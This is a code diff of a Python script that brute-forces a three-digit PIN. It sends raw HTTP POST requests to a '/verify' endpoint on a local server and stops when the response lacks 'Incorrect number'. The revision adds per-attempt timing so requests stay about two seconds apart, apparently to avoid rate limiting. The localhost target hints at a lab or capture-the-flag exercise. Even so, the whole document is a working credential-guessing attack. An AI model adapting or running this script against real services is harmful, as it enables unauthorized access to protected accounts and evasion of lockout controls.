@@ -1,48 +1,51 @@
 import socket
-import time  # so we can slow down a bit
+import time
 
 HOST = '127.0.0.1'
 PORT = 8888
 
-for i in range(1000):
-    guess = str(i).zfill(3)
-    data = f"pin={guess}"
+for attempt in range(1000):
+    start = time.time()
 
-    req = (
-        "POST / HTTP/1.1\r\n"
+    pin = str(attempt).zfill(3)
+    payload = f"magicNumber={pin}"
+
+    request = (
+        "POST /verify HTTP/1.1\r\n"
         f"Host: {HOST}:{PORT}\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
-        f"Content-Length: {len(data)}\r\n"
+        f"Content-Length: {len(payload)}\r\n"
         "Connection: close\r\n"
         "\r\n"
-        f"{data}"
+        f"{payload}"
     )
 
     try:
-        sock = socket.socket()
-        sock.connect((HOST, PORT))
-        sock.send(req.encode())
+        s = socket.socket()
+        s.connect((HOST, PORT))
+        s.send(request.encode())
 
-        result = b""
+        response = b""
         while True:
-            chunk = sock.recv(1024)
+            chunk = s.recv(4096)
             if not chunk:
                 break
-            result += chunk
+            response += chunk
 
-        output = result.decode(errors="ignore")
+        output = response.decode(errors="ignore")
 
-        if "Success" in output or "Welcome" in output or "Correct" in output:
-            print(f"[🎉] PIN FOUND: {guess}")
+        if "Incorrect number" not in output:
+            print(f"[🎉] SUCCESS! PIN is: {pin}")
             break
         else:
-            print(f"Try {guess} -> no luck")
+            print(f"Trying PIN {pin} -> wrong")
 
-        sock.close()
+        s.close()
 
-        # wait a bit so server doesn't freak out lol
-        time.sleep(0.5)
+        elapsed = time.time() - start
+        if elapsed < 2.0:
+            time.sleep(2.0 - elapsed)
 
-    except Exception as err:
-        print(f"[x] pin {guess} failed: {err}")
+    except Exception as e:
+        print(f"[!] Error with {pin}: {e}")
         continue
